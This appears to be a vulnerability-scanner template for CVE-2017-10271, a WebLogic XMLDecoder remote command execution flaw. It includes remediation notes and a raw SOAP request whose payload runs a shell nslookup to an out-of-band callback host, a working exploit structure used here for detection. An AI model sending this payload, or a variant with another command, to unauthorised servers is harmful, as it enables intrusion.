id: CVE-2017-10271
info:
  name: Oracle Fusion Middleware WebLogic Server - Remote Command Execution
  author:
  - dr_set
  description: |-
    WebLogic XMLDecoder反序列化漏洞
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。

    Oracle Fusion Middleware中的Oracle WebLogic Server组件的WebLogic WLS组件子组件存在远程命令执行漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。

    未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，获取服务器权限，实现远程代码执行。
    受影响WebLogic版本：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

    临时修复方案：
    1、升级官方安全补丁或删除wls-wsat.war和bea_wls9_async_response相关组件并重启WebLogic，如：bea_wls9_async_response.war、com.oracle.webservices.wls.bea-wls9-async-response_*.war和wls-wsat.war
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: status
    status:
    - 500
  matchers-condition: and
  raw:
  - |
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: en
    Content-Type: text/xml

    <?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext
                xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.4.0" class="java.beans.XMLDecoder">
                    <void class="java.lang.ProcessBuilder">
                        <array class="java.lang.String" length="3">
                            <void index="0">
                                <string>/bin/bash</string>
                            </void>
                            <void index="1">
                                <string>-c</string>
                            </void>
                            <void index="2">
                                <string>nslookup {{interactsh-url}}</string>
                            </void>
                        </array>
                        <void method="start"/></void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
